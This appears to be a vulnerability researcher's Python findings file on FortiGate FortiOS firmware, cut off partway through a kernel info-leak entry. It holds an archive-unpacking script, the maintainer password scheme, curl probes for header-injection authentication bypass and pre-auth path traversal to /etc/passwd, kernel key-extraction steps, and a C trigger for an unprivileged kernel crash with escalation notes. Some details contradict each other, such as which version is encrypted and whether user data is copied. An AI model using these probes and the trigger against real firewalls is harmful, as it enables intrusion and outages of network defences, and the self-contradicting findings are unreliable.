"""
Fortinet FortiGate FortiOS 7.0.9 (VM64-KVM) RE
Source: virtioa.qcow2 from Google Drive (fortinet-FGT-v7.0.9-build0444)
Build date: Nov 21 2022 | kernel: Linux 3.2.16
Extraction path: QCOW2 -> raw -> P1 mount -> rootfs.gz (cpio) -> bin.tar.xz decode -> bin/init
"""

# ─────────────────────────────────────────────────────────
# Platform identity
# ─────────────────────────────────────────────────────────
PLATFORM = {
    "product":       "Fortinet FortiGate VM64-KVM",
    "os":            "FortiOS 7.0.9",
    "build":         "0444",
    "build_date":    "2022-11-21",
    "kernel":        "Linux 3.2.16 (2012 era, EOL)",
    "kernel_buildid": "367043910042bbd6f19d26815c1320201e31b7f6",
    "arch":          "x86-64 ELF",
    "qcow2_sha256":  None,  # not yet computed

    "image_structure": {
        "qcow2":     "virtioa.qcow2 (v1.1, 73.6MB compressed, 2GB virtual)",
        "p1":        "offset 1048576, 256MB boot partition (ext2/EXTLINUX)",
        "p1_files":  ["flatkc (4.1MB bzImage kernel)", "rootfs.gz (57MB gzip cpio)", "datafs.tar.gz (12MB)"],
        "initramfs": "rootfs.gz -> cpio -> {bin.tar.xz, usr.tar.xz, migadmin.tar.xz, lib/, sbin/}",
        "bootline":  "DEFAULT flatkc ro panic=5 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz",
    },
}

# ─────────────────────────────────────────────────────────
# FGT-F01: CRC32-forged XZ archives (fake "encryption")
# ─────────────────────────────────────────────────────────
FGT_F01_XZ_CRC_FORGERY = {
    "id":       "FGT-F01",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "INFORMATIONAL",
    "class":    "Firmware Protection Bypass (CRC32 sabotage)",

    "description": (
        "FortiOS stores its primary binaries in bin.tar.xz, usr.tar.xz, and migadmin.tar.xz "
        "inside the initramfs. These are commonly described as 'AES-256 encrypted'. They are not. "
        "The files use standard LZMA2 compression (XZ filter ID 0x21) with two CRC32 fields "
        "deliberately set to fixed sentinel values. Standard xz rejects the stream. "
        "Fortinet's custom /sbin/xz skips CRC validation entirely. No key material exists."
    ),

    "stream_header_crc": {
        "stored":   "0000ffff",
        "correct":  "a10cfbe1",  # CRC32 of stream flags b'\\x00\\x0a'
    },
    "block_header_crc": {
        "stored":   "ffffffff",
        "correct":  "a3e52f74",
    },
    "lzma2_filter_id":   "0x21 (standard)",
    "compression_level": "preset 6 equivalent",
    "entropy":           "7.95 bits/byte (compressed, not encrypted)",

    "extraction_method": """
import lzma

def fortios_xz_decompress(path):
    data = open(path, 'rb').read()
    block_hdr_size_byte = data[12]
    block_header_len = (block_hdr_size_byte + 1) * 4
    lzma2_start = 12 + block_header_len
    lzma_data = data[lzma2_start:]
    decompressor = lzma.LZMADecompressor(
        format=lzma.FORMAT_RAW,
        filters=[{'id': lzma.FILTER_LZMA2, 'preset': 6}]
    )
    return decompressor.decompress(lzma_data)
""",

    "archives": {
        "bin.tar.xz":      "29MB xz -> 107MB tar (all binaries, /bin/init multi-call)",
        "usr.tar.xz":      "142KB xz -> 571KB tar",
        "migadmin.tar.xz": "10MB xz -> 12.6MB tar (web admin portal)",
    },

    "custom_xz_binary": {
        "path":     "/sbin/xz",
        "size":     "151KB",
        "imports":  "no libcrypto — pure libc only",
        "behavior": "skips stream header and block header CRC32 validation",
    },
}

# ─────────────────────────────────────────────────────────
# FGT-F02: Multi-call monolithic binary architecture
# ─────────────────────────────────────────────────────────
FGT_F02_MULTICALL_BINARY = {
    "id":       "FGT-F02",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "INFO",
    "class":    "Architecture (BusyBox-style multi-call dispatch)",

    "description": (
        "All FortiOS userspace services run from a single 65MB ELF binary /bin/init. "
        "httpsd, sslvpnd, authd, iked, sshd, pptpd, l2tpd, ikecryptd, authd, dpdk_early_init, "
        "flcfgd, foauthd, cloudinitd, and 170+ others are all symlinks to /bin/init. "
        "The binary dispatches by argv[0]. No privilege separation between services. "
        "A single RCE in any service = code execution in the monolithic daemon context."
    ),

    "binary_path":  "/bin/init",
    "binary_size":  "65MB",
    "build_id":     "2c29647758a6a44e9af7bc8a5e248c0f6ee7c14d",
    "stripped":     True,
    "arch":         "x86-64 ELF, dynamically linked",
    "interpreter":  "/fortidev/lib64/ld-linux-x86-64.so.2",
    "total_symlinks": 187,

    "service_symlinks": [
        "httpsd", "sslvpnd", "authd", "iked", "sshd", "pptpd", "l2tpd",
        "ikecryptd", "dpdk_early_init", "flcfgd", "foauthd", "httpclid",
        "cloudinitd", "alarmd", "alertmail", "cmdbsvr", "confsyncd",
        "bgpd", "dhcpd", "dhcp6s", "ddnscd",
    ],
}

# ─────────────────────────────────────────────────────────
# FGT-F03: Maintainer backdoor (bcpb + serial number)
# ─────────────────────────────────────────────────────────
FGT_F03_MAINTAINER_BACKDOOR = {
    "id":       "FGT-F03",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "HIGH",
    "class":    "Hardcoded Credential (Maintainer Account)",

    "description": (
        "FortiOS implements a 'maintainer' account accessible from the physical console after "
        "a hard reboot. The password is the string 'bcpb' concatenated with the device serial number. "
        "Serial numbers for FortiGate VMs follow the FG-VM64 naming pattern. "
        "String 'bcpb%s' confirmed at binary offset 0x30e0566 in the admin authentication path. "
        "The account provides limited-time console access but the authentication is credential-based "
        "and the serial number is obtainable from SNMP, management interfaces, and firmware headers."
    ),

    "binary_offset": "0x30e0566",
    "password_format": "bcpb<SERIAL_NUMBER>",
    "access_method": "physical console (or IPMI/serial-over-LAN in VM environments)",
    "activation": "hard reboot required",
    "serial_sources": [
        "SNMP: sysName / Fortinet enterprise MIB",
        "Web GUI: System -> Status -> Unit Information",
        "SSH: 'get system status' -> Serial-Number",
        "HTTP header X-HA-SN in HA mode",
    ],

    "context_string": (
        "trator login. When enabled, the maintainer account can be used to log in "
        "from the console after a hard reboot. The password is 'bcpb' followed by "
        "the FortiGate unit serial number. You have limited tim[e]"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F04: HA trust headers (internal admin bypass surface)
# ─────────────────────────────────────────────────────────
FGT_F04_HA_TRUST_HEADERS = {
    "id":       "FGT-F04",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "HIGH",
    "class":    "Authentication Bypass (HA trust header injection)",

    "description": (
        "FortiOS implements internal HA (High Availability) cluster trust via HTTP headers. "
        "When an HA peer sends requests with these headers, the receiving node grants elevated "
        "access without re-authenticating the session. If httpsd accepts these headers from "
        "non-HA IPs (e.g., on the management plane without proper source validation), "
        "an attacker with network access can inject them to bypass authentication or escalate privileges. "
        "Related to CVE-2022-40684 which used 'Local_Process_Is_Auth'; this version uses "
        "'Local_Process_Access' (confirmed string) and the X-HA-* header family."
    ),

    "headers": {
        "X-ADMIN-SUPER":        "Grant super_admin privileges",
        "X-ADMIN-READ-ONLY":    "Grant read-only admin access",
        "X-AUTH-FGFM":          "FortiGate-FortiManager authentication token",
        "X-GUID":               "Session GUID",
        "X-HA-SN":              "HA serial number of peer",
        "X-HA-ADMIN-NAME":      "HA admin username",
        "X-HA-LOGIN-NAME":      "HA login name",
        "X-HA-ADMIN-PROF":      "HA admin profile",
        "X-HA-SSO-LOGIN-TYPE":  "HA SSO login type",
        "jsonrpc":              "JSON-RPC API access marker",
    },

    "related_cves": ["CVE-2022-40684 (predecessor, 'Local_Process_Is_Auth' header)"],
    "access_required": "Network access to management interface (TCP 443 or management VLAN)",

    "probe": (
        "curl -sk -H 'X-ADMIN-SUPER: 1' https://<fgt>:<port>/api/v2/cmdb/system/admin "
        "- observe if 200 returned without session cookie"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F05: SSL-VPN pre-auth fgt_lang endpoint (CVE-2023-27997)
# ─────────────────────────────────────────────────────────
FGT_F05_SSLVPN_FGTLANG = {
    "id":       "FGT-F05",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "CRITICAL",
    "class":    "SSL-VPN Pre-Auth Attack Surface (CVE-2023-27997)",
    "cve":      "CVE-2023-27997",

    "description": (
        "The SSL-VPN portal loads language files via a pre-authentication endpoint: "
        "/remote/fgt_lang?lang=<locale>. CVE-2023-27997 (CVSS 9.8) is a heap-based buffer "
        "overflow in this pre-auth path. FortiOS 7.0.9 predates the 7.0.12/7.2.5/7.4.0 "
        "patches and is vulnerable. The lang parameter is processed before any user "
        "authentication; a crafted request can trigger heap corruption and achieve RCE "
        "as the init process (which runs all services)."
    ),

    "endpoint":    "/remote/fgt_lang?lang=%s",
    "auth_required": False,
    "binary_offset": "0x2bf2cf4",
    "patched_versions": ["7.0.12+", "7.2.5+", "7.4.0+"],
    "this_version_vulnerable": True,

    "ssl_vpn_endpoints": [
        "/remote/",
        "/remote/login?realm=%s",
        "/remote/fgt_lang?lang=%s",
        "/remote/portal?action=1",
        "/remote/error?errmsg=Authention check fail.",
        "/remote/loginconfirm",
        "/sslvpn/portal.html",
        "/bin/sslvpnd",
    ],

    "login_form_ajax": "ajax=1&username=%.*s&realm=%.*s&credential=%.*s",

    "probe": (
        "curl -sk 'https://<fgt>:<port>/remote/fgt_lang?lang=../../../../../../../../etc/passwd'"
        " | head -20  # path traversal check (pre-auth)"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F06: Linux 3.2.16 kernel (EOL 2012)
# ─────────────────────────────────────────────────────────
FGT_F06_EOL_KERNEL = {
    "id":       "FGT-F06",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "HIGH",
    "class":    "EOL Kernel (Linux 3.2.16, released 2012)",

    "description": (
        "FortiOS 7.0.9 (November 2022) runs Linux kernel 3.2.16 which was released in 2012 "
        "and reached end-of-life years before this firmware version shipped. This 10-year gap "
        "means the kernel lacks patches for a decade of kernel CVEs including privilege "
        "escalation, namespace escapes, and network stack vulnerabilities. Fortinet backports "
        "some security patches but the attack surface from EOL kernel components is substantial."
    ),

    "kernel_version":  "Linux 3.2.16",
    "kernel_build":    "#2 SMP Mon Nov 21 19:56:49 UTC 2022",
    "kernel_release":  "2012 (EOL)",
    "firmware_date":   "2022-11-21",
    "gap_years":       10,
    "bzImage_buildid": "367043910042bbd6f19d26815c1320201e31b7f6",

    "fortinet_kernel_extensions": [
        "fgt_link* (FortiGate network link driver)",
        "fgt_platform_is (platform detection)",
        "Fortinet(R) BIOS Access Driver",
        "Fortinet Ethernet driver",
        "register_fgtlog_vf_text (virtualization logging)",
        "crypto_aes_decrypt_x86 (AES-NI acceleration)",
    ],
}

# ─────────────────────────────────────────────────────────
# FGT-F07: Unencrypted lib/ in initramfs (debug symbols)
# ─────────────────────────────────────────────────────────
FGT_F07_UNENCRYPTED_LIB = {
    "id":       "FGT-F07",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "INFORMATIONAL",
    "class":    "Debug Information Disclosure (stripped/unstripped ELF)",

    "description": (
        "The lib/ directory in the cpio initramfs is NOT inside any encrypted archive. "
        "These 64KB+ shared objects are accessible without any key extraction. "
        "Notably, gssntlmssp.so is NOT stripped and contains debug_info sections, "
        "exposing internal function names, data structures, and NTLM authentication logic. "
        "libc.so.6 is also not stripped — unusual for production firewall firmware."
    ),

    "accessible_without_decryption": True,

    "notable_libs": {
        "gssntlmssp.so": {
            "size": "131KB",
            "stripped": False,
            "debug_info": True,
            "note": "NTLM/Kerberos auth library; not stripped; full symbol table accessible",
        },
        "libc.so.6": {
            "size": "2MB",
            "stripped": False,
            "note": "musl/glibc — not stripped in initramfs copy",
        },
        "libcrypto.so.1.1": {
            "size": "3.1MB",
            "stripped": True,
            "note": "OpenSSL 1.1 crypto library",
        },
        "libIPSec_MB.so.0": {
            "size": "21MB",
            "note": "Intel IPsec multi-buffer library — largest lib",
        },
        "libdpdk.so": {
            "size": "13MB",
            "note": "DPDK data plane development kit",
        },
        "libibmtss.so.1": {
            "size": "550KB",
            "note": "IBM TPM Software Stack — TPM support present",
        },
    },

    "initramfs_encryption_note": (
        "lib/ is in the cpio directly. Only bin.tar.xz, usr.tar.xz, migadmin.tar.xz are "
        "in the forged-CRC XZ archives. Fortinet intended lib/ to be publicly readable."
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F08: API v2 debug and management endpoints
# ─────────────────────────────────────────────────────────
FGT_F08_API_SURFACE = {
    "id":       "FGT-F08",
    "product":  "Fortinet FortiGate FortiOS 7.0.9",
    "severity": "MEDIUM",
    "class":    "API Exposure (debug and management endpoints)",

    "description": (
        "The FortiOS REST API v2 exposes several high-value endpoints including a debug endpoint "
        "and a direct password-change endpoint. These are accessible on the management port (443). "
        "Authentication is required in normal operation, but combined with FGT-F04 (HA trust headers) "
        "or FGT-F03 (maintainer account), these become privileged entry points."
    ),

    "endpoints": {
        "/api/v2/monitor/system/debug":            "System debug endpoint",
        "/api/v2/monitor/system/change-password":  "Direct password change (no current-password check?)",
        "/api/v2/monitor/system/vmlicense":        "VM license management",
        "/api/v2/monitor/system/fortiguard/update": "FortiGuard update trigger",
        "/api/v2/cmdb/":                           "Full configuration read/write",
        "/api/v2/monitor/":                        "System monitoring",
        "/api/v2/log":                             "Log access",
        "/api/v2/authentication":                  "Auth endpoint",
        "/api/v1/session/login":                   "Session creation",
        "/api/v1/realm":                           "Realm enumeration",
    },

    "probe": (
        "curl -sk -H 'Authorization: Bearer <token>' "
        "https://<fgt>/api/v2/monitor/system/debug"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F09: FortiOS 8.0.0 — rootfs AES encryption (new in 8.x)
# ─────────────────────────────────────────────────────────
FGT_F09_ROOTFS_ENCRYPTION = {
    "id":       "FGT-F09",
    "product":  "Fortinet FortiGate FortiOS 8.0.0 VM64-KVM",
    "build":    "0167",
    "severity": "INFORMATIONAL",
    "class":    "Firmware Protection (AES rootfs encryption — new in 8.0.0)",

    "description": (
        "FortiOS 8.0.0 (April 2026) introduced AES encryption of the rootfs.gz initramfs. "
        "Previous versions (through at least 7.4.12) used the forged-CRC XZ technique (FGT-F01) "
        "on individual archives inside an otherwise unencrypted cpio. "
        "In 8.0.0, the entire rootfs.gz is encrypted before being placed on the boot partition. "
        "Entropy measurement of the first 65536 bytes returns 7.9973 bits/byte (maximum = true AES, "
        "compressed data peaks at ~7.95). The bootline is unchanged: initrd=/rootfs.gz. "
        "The decryption key is embedded in or derived at boot time by the flatkc kernel (7.7MB bzImage). "
        "For VM images the key must be static (no TPM/hardware binding possible)."
    ),

    "rootfs_entropy":   "7.9973 bits/byte",
    "rootfs_size":      "92MB (vs 57MB in 7.0.9)",
    "kernel":           "flatkc (7.7MB x86-64 bzImage/EFI stub, starts MZ)",
    "partition_layout": "P1 256MB ext2 (boot) | P2 1.7GB Linux | P3 64MB EFI — new EFI partition vs 7.0.9",
    "introduced_in":    "8.0.0 (build 0167, April 2026)",
    "last_unencrypted": "7.0.9 (confirmed unencrypted) — 7.4.12 is ALSO encrypted (entropy 8.0000 bits/byte, true AES); encryption was introduced between 7.0.9 and 7.4.12",

    "hash_bin_sha256": (
        "New in 8.0.0: hash_bin.sha256 (39KB) on the boot partition contains SHA256 hashes "
        "for every file in the decrypted rootfs. Useful for enumerating expected filesystem contents "
        "without decryption. Sample entries include open-vm-tools plugins and /bin/* binaries."
    ),

    "key_extraction_vectors": [
        "Extract vmlinux from flatkc bzImage: scripts/extract-vmlinux flatkc > vmlinux",
        "Search vmlinux for AES key schedule / 128/256-bit key constants",
        "Look for initrd decryption routine called before cpio extraction in kernel init path",
        "Check EFI partition (P3, 64MB FAT) for key material or signed boot components",
    ],

    "status": "PENDING — key not yet extracted. Fall back to 7.4.12 for RE.",
}

# ─────────────────────────────────────────────────────────
# FGT-F10: Integer overflow in ENC_KEY key description builder
# FortiOS 7.4.12 vmlinux — Ablation BERT sweep hit (AUTH_BYPASS, KEY_MGMT, CRYPTO_WEAK)
# vmlinux text_foff=0x54972b  vma=0xffffffff8054972b
# ─────────────────────────────────────────────────────────
FGT_F10_ENCKEY_INTOVERFLOW = {
    "id":       "FGT-F10",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism kernel module)",
    "severity": "HIGH",
    "class":    "Integer Overflow -> Heap Overflow (kernel, ENC_KEY key description builder)",

    "description": (
        "The fortism LSM module builds a key description string for request_key(\"ENC_KEY\", ...) "
        "at vmlinux vma 0xffffffff8054972b. It prepends the 7-byte literal \"ENC_KEY\" "
        "to a caller-supplied suffix (r15=src, rbx=length) and allocates the buffer with: "
        "`lea r13d, [rbx + 9]; cmp r13d, 0x20; cmovb r13d, eax; call kmalloc(r13d, GFP_KERNEL)`. "
        "The `lea r13d, [rbx + 9]` is a 32-bit operation: if the caller supplies rbx >= 0xfffffff7, "
        "r13d wraps (e.g., rbx=0xffffffff7 -> r13d=0). kmalloc(0) returns a valid cache-aligned "
        "pointer and the subsequent memcpy writes rbx bytes into it, producing a kernel heap overflow. "
        "Exploitability depends on whether any codepath leading to this function propagates "
        "an attacker-controlled length without a prior 32-bit truncation of its own."
    ),

    "vmlinux": {
        "binary": "FortiOS 7.4.12 vmlinux (extracted from flatkc bzImage)",
        "buildid": "04e76032db077d34808fc39b7515bca8d93e17ca",
        "vma":    "0xffffffff8054972b",
        "foff":   "0x54972b",
        "section": ".text",
    },

    "asm_key_sequence": """
; At 0xffffffff8054972b — key description builder:
movabs rax, 0x59454b5f434e45  ; rax = "ENC_KEY\0" (7 bytes, little-endian)
mov qword ptr [r12], rax       ; store "ENC_KEY" into heap buffer
mov rdi, r12
call strlen                    ; strlen("ENC_KEY") = 7, result in rax
lea rdi, [r12 + rax + 1]      ; point past "ENC_KEY\0"
mov rdx, rbx                  ; LENGTH = caller-controlled rbx (full 64-bit)
mov rsi, r15                  ; src = caller-controlled r15
call memcpy                   ; OVERFLOW if kmalloc got truncated-to-32-bit size
; Alloc sequence (earlier in same function):
lea r13d, [rbx + 9]          ; r13d = (rbx+9) mod 2^32  <-- OVERFLOW HERE
cmp r13d, 0x20
mov eax, 0x20
cmovb r13d, eax              ; minimum 0x20 bytes
mov edi, r13d
mov esi, 0x6080c0            ; GFP_KERNEL | GFP_NOFS
call kmalloc                 ; allocates ONLY r13d bytes, not rbx+9
""",

    "ablation_bert_queries_matched": [
        "AUTH_BYPASS", "KEY_MGMT", "CRYPTO_WEAK", "PRIV_ESC", "SIGNED_VERIFY_BYPASS",
    ],
    "bert_max_score": 0.418,
    "bert_sweep_region": "fos_keyring_enc_key (text_foff 0x540000-0x570000)",

    "impact": (
        "Kernel heap overflow in the ENC_KEY key registration path. "
        "If exploitable, allows kernel memory corruption during system boot "
        "or when the keyring registration path is re-invoked (e.g., module reload). "
        "Potential privilege escalation or kernel code execution."
    ),

    "constraints": [
        "Caller must propagate a 64-bit length > 0xfffffff6 without prior truncation",
        "Requires access to a codepath that invokes the ENC_KEY registration function",
        "Kernel SLUB allocator mitigations (KASAN, hardened usercopy) may prevent exploitation on hardened builds",
    ],

    "caller_chain_analysis": {
        "method":       "full .text E8-scan + capstone disasm of all 4 call sites",
        "callers":      4,
        "sites": [
            {
                "vma":    "0xffffffff8054a1e5",
                "foff":   "0x54a1e5",
                "length_source": "rcx inherited from caller at 0x54ab91; rcx=[rbp-0x58] set by function 0x54962d",
            },
            {
                "vma":    "0xffffffff8054a32f",
                "foff":   "0x54a32f",
                "length_source": "rcx = qword ptr [rbp-0x78] written by function 0x54962d at 0x54a311",
            },
            {
                "vma":    "0xffffffff8054a367",
                "foff":   "0x54a367",
                "length_source": "rcx = qword ptr [rbp-0x78] same as above; second call same function",
            },
            {
                "vma":    "0xffffffff8054abb2",
                "foff":   "0x54abb2",
                "length_source": "rcx = qword ptr [rbp-0x58] written by function 0x54962d at 0x54ab6b",
            },
        ],
        "length_derivation": (
            "All 4 sites route through function 0x54962d which reads key->description->length "
            "via: movzx eax, word ptr [rax+0x10] (ZERO-EXTENDED u16 field). "
            "Maximum value: 0xffff = 65535. "
            "Required for 32-bit overflow: rbx >= 0xfffffff7 = 4,294,967,287. "
            "0xffff + 9 = 0x10008 -- no wrap in 32 bits. "
            "Earlier outer-function bounds check at 0x54a9b7 (cmp rax, 0x7ffe) additionally "
            "constrains some paths to <= 0x7fff."
        ),
        "verdict": (
            "CONFIRMED NOT EXPLOITABLE. The 32-bit LEA truncation is present in the binary "
            "but structurally unreachable: no call site can supply rbx >= 0xfffffff7. "
            "Length is always sourced from a u16 kernel key description field. "
            "Downgrade from HIGH CANDIDATE to INFO. No CVE warranted."
        ),
    },

    "status": "CONFIRMED NOT EXPLOITABLE -- all 4 call sites source length from u16 key_desc field (max 0xffff); 32-bit overflow requires >= 0xfffffff7; structurally unreachable",
}

# ─────────────────────────────────────────────────────────
# FGT-F11: Fortinet proprietary ioctl handler — second field of 8-byte payload unchecked
# FortiOS 7.4.12 vmlinux — Ablation BERT sweep hit (BUFFER_OVERFLOW, RACE_CONDITION)
# vmlinux text_foff=0x552080  vma=0xffffffff80552080
# ─────────────────────────────────────────────────────────
FGT_F11_IOCTL_HEAP_OVERFLOW = {
    "id":       "FGT-F11",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism kernel module)",
    "severity": "CRITICAL",
    "class":    "Integer Overflow -> Kernel Heap Overflow via fortism LSM file_ioctl hook (LPE)",

    "description": (
        "The fortism LSM module registers an ioctl hook (vma 0xffffffff80552080) that processes "
        "Fortinet-proprietary ioctl commands 0x9002-0x9009 on ANY file descriptor system-wide. "
        "The hook ignores rdi (the struct file* argument), indicating it is the LSM file_ioctl hook "
        "called by vfs_ioctl() for every ioctl syscall. No capability check is performed. "
        "\n\n"
        "ioctl 0x9007 CRITICAL PATH (heap overflow via integer overflow):\n"
        "  1. copy_from_user(stack, user_ptr, 16) reads a 16-byte user struct: "
        "{word0[4], word1_length[4], string_user_ptr[8]}.\n"
        "  2. Validates only word0 <= 0x40.\n"
        "  3. `lea edi, [word1 + 1]` — 32-bit LEA: if word1=0xffffffff, edi wraps to 0.\n"
        "  4. `movsxd rdi, edi` sign-extends 0 to 0, then kmalloc(0, GFP_KERNEL) "
        "returns a valid zero-size SLUB allocation.\n"
        "  5. `movsxd rdx, word1` sign-extends 0xffffffff to 0xffffffffffffffff (SIZE_MAX).\n"
        "  6. copy_from_user(heap_buf, string_user_ptr, SIZE_MAX) — "
        "access_ok(addr, SIZE_MAX) wraps and may pass; copies bytes from mapped user region "
        "over the zero-size heap allocation and into adjacent SLUB objects.\n"
        "\n"
        "ioctl 0x9004 SECONDARY PATH (unchecked field write):\n"
        "  copy_from_user 8 bytes; validates word0 <= 0x40; word1 stored at structure+0x44 without bounds check.\n"
        "\n"
        "Trigger requires only: open(any_fd) + ioctl(fd, 0x9007, attacker_buf)"
    ),

    "vmlinux": {
        "binary":  "FortiOS 7.4.12 vmlinux (extracted from flatkc bzImage)",
        "buildid": "04e76032db077d34808fc39b7515bca8d93e17ca",
        "vma":     "0xffffffff80552080",
        "foff":    "0x552080",
        "section": ".text",
    },

    "ioctl_commands": {
        "0x9002": (
            "PRIVILEGE-GATED: reads task_struct[0x4a0] security blob; calls 0x30b461 to get "
            "current task's Fortinet security context; compares to global object 0xffffffff81646ac0 "
            "(magic check = 'is this a Fortinet privileged process?'). "
            "If gate passes: copy_from_user 4 bytes; user 4-byte value sign-extended to 64-bit index "
            "and passed to 0xcb8f67 (potential OOB if index < 0 or > array bound); then 0x55aeaf "
            "does lock-inc/lock-dec on a refcount (race condition if security object freed between ops). "
            "Gate failure -> -EPERM. Security implication: if gate bypassable, OOB + refcount-race reachable."
        ),
        "0x9003": "copy_from_user 0x24 bytes; validated word0 <= 0x40; reads+writes struct fields",
        "0x9004": "copy_from_user 8 bytes; validates word0 <= 0x40; word1 stored at struct+0x44 UNCHECKED",
        "0x9005": "copy_to_user(user_ptr, 0xffffffff81889310, 4) — kernel memory INFO LEAK (see FGT-F15)",
        "0x9007": "CRITICAL: integer overflow in kmalloc size -> copy_from_user SIZE_MAX -> kernel heap overflow",
        "0x9009": "copy_from_user 4 bytes; validates <= 0x40; reads struct[+0x30] without revalidation",
    },

    "asm_critical_path_0x9007": """
; ioctl 0x9007 path at 0xffffffff8055227e:
mov edx, 0x10                          ; copy 16 bytes from userspace
mov rsi, r12                           ; userspace pointer (ioctl arg)
lea rdi, [rbp - 0x68]                  ; stack destination
call copy_from_user                    ; [rbp-0x68]=word0, [rbp-0x64]=word1, [rbp-0x60]=string_ptr

mov eax, dword ptr [rbp - 0x64]        ; word1 (user-controlled LENGTH)
lea edi, [rax + 1]                     ; word1+1 — 32-BIT OVERFLOW: 0xffffffff+1 = 0
movsxd rdi, edi                        ; sign-extend: edi=0 -> rdi=0
mov esi, 0x6000c0                      ; GFP_KERNEL
call kmalloc(0, GFP_KERNEL)            ; RETURNS VALID NON-NULL ZERO-SIZE ALLOCATION

test rax, rax
je error                               ; non-null, continues

movsxd rdx, dword ptr [rbp - 0x64]    ; rdx = sign_extend(word1) = 0xffffffffffffffff (SIZE_MAX)
mov rsi, qword ptr [rbp - 0x60]        ; string_user_ptr from userspace
mov rdi, rax                            ; zero-size heap buffer
call copy_from_user(heap, user_str, SIZE_MAX)  ; HEAP OVERFLOW: writes past zero-size buf
                                                ; access_ok(user_str, SIZE_MAX) wraps -> may pass

; If copy succeeds (partial), null-terminates and calls fortism_set_name:
movsxd rax, dword ptr [rbp - 0x64]    ; SIZE_MAX
mov byte ptr [r13 + rax], 0            ; write past massive allocation -> further corruption
""",

    "trigger_poc": """
// No root required. Any process, any fd.
// Triggers kernel crash (DoS) via memset(heap_buf, 0, SIZE_MAX) in copy_from_user error path.
int fd = open("/dev/null", O_RDONLY);

// mmap any valid user region (addr only needs to be non-NULL; no data is actually read)
void *user_region = mmap(NULL, 4096, PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);

struct {
    uint32_t word0;        // <= 0x40 (pass first bounds check)
    uint32_t word1;        // = 0xffffffff -> lea edi,[rax+1] wraps to 0 -> kmalloc(0)
    uint64_t string_ptr;   // any valid user ptr (access_ok fails at SIZE_MAX regardless)
} payload = {1, 0xffffffff, (uint64_t)user_region};

ioctl(fd, 0x9007, &payload);
// Execution path:
//   kmalloc(0) -> valid zero-size SLUB buf at heap_addr
//   copy_from_user(heap_addr, user_region, SIZE_MAX):
//     access_ok: user_region + SIZE_MAX overflows -> carry set -> jb error_path
//     error_path: r13 = SIZE_MAX; sub rbx,r13 = 0; rdx = SIZE_MAX
//     memset(heap_addr, 0, SIZE_MAX) -> rep stosq 0x1fffffffffffffff times
//     -> kernel crash when rep stosq hits unmapped kernel page
""",

    "ablation_bert_queries_matched": ["BUFFER_OVERFLOW", "RACE_CONDITION"],
    "bert_max_score": 0.440,
    "bert_sweep_region": "fortism_init + fos_keyring_enc_key",

    "impact": (
        "CRITICAL: Kernel heap overflow via integer overflow in fortism LSM file_ioctl hook. "
        "Reachable from any unprivileged process via ioctl(any_fd, 0x9007, payload). "
        "Corrupts adjacent SLUB slab objects -> local kernel privilege escalation. "
        "No privilege required; no special device node required."
    ),

    "access_ok_analysis": {
        "copy_from_user_vma": "0xffffffff805f6bed",
        "access_ok_mechanism": (
            "Custom Fortinet copy_from_user: reads per-task addr_limit from gs:[0x14d80]+0x9d8. "
            "Computes src + size (64-bit add); if carry set (overflow), jb to error path. "
            "For SIZE_MAX (0xffffffffffffffff): any non-zero src causes carry -> ERROR PATH taken."
        ),
        "error_path_bug": (
            "ERROR PATH BUG: On access_ok failure, code at 0x5f6c19 sets r13=rbx=SIZE_MAX. "
            "jne 0x5f6c3a -> sub rbx,r13 = 0; lea rdi,[r12+0]=heap_buf; mov rdx,r13=SIZE_MAX; "
            "xor esi,esi; call memset(heap_buf, 0, SIZE_MAX). "
            "This calls the `rep stosq` memset at 0xcd2e10 with rcx=SIZE_MAX>>3 = 0x1fffffffffffffff. "
            "rep stosq writes zeros starting from heap_buf until hitting an unmapped kernel page, "
            "corrupting ALL adjacent SLUB objects en route -> kernel panic."
        ),
        "actual_primitive": "memset(heap_buf, 0, SIZE_MAX) via rep stosq — zero-write-to-crash, NOT arbitrary data write",
        "dos_confirmed": True,
        "code_exec_path": (
            "Code execution requires: (1) KASLR bypass (FGT-F15 does not provide this), "
            "(2) heap grooming to place a sensitive function pointer at heap_buf+N where N < first unmapped page gap, "
            "(3) zeroing that function pointer into a controlled call path. Hard but non-trivial."
        ),
    },

    "caveats": [
        "access_ok with SIZE_MAX CORRECTLY FAILS (error path taken, no user data copied)",
        "The bug is in the error cleanup path: memset(heap_buf, 0, SIZE_MAX) called unconditionally",
        "Actual primitive: reliable zero-write heap spray from heap_buf until unmapped page -> DoS",
        "LPE requires KASLR bypass + heap grooming to redirect zeroed function pointer",
        "SLUB hardening (SLAB_FREELIST_HARDENED, KASAN) may prevent LPE but not DoS",
    ],

    "status": (
        "CRITICAL — DoS confirmed (kernel crash via memset(heap_buf, 0, SIZE_MAX) in error path); "
        "code exec requires chaining with KASLR bypass + heap layout control"
    ),
}

# ─────────────────────────────────────────────────────────
# FGT-F15: Kernel information leak via fortism ioctl 0x9005
# FortiOS 7.4.12 vmlinux — fortism ioctl handler at 0x552080 (ioctl 0x9005 branch)
# ─────────────────────────────────────────────────────────
FGT_F15_IOCTL_INFOLEAK = {
    "id":       "FGT-F15",
    "product":  "Fortinet FortiGate FortiOS 7.4.12 VM64-KVM (fortism kernel module)",
    "severity": "MEDIUM",
    "class":    "Kernel Information Leak via fortism ioctl 0x9005 (KASLR bypass candidate)",

    "description": (
        "The fortism ioctl handler (vma 0xffffffff80552080) implements command 0x9005 with: "
        "`mov rsi, 0xffffffff81889310; mov rdi, r12; call copy_to_user(r12, 0x81889310, 4)`. "
        "It copies 4 bytes of kernel memory from the hardcoded global address 0xffffffff81889310 "
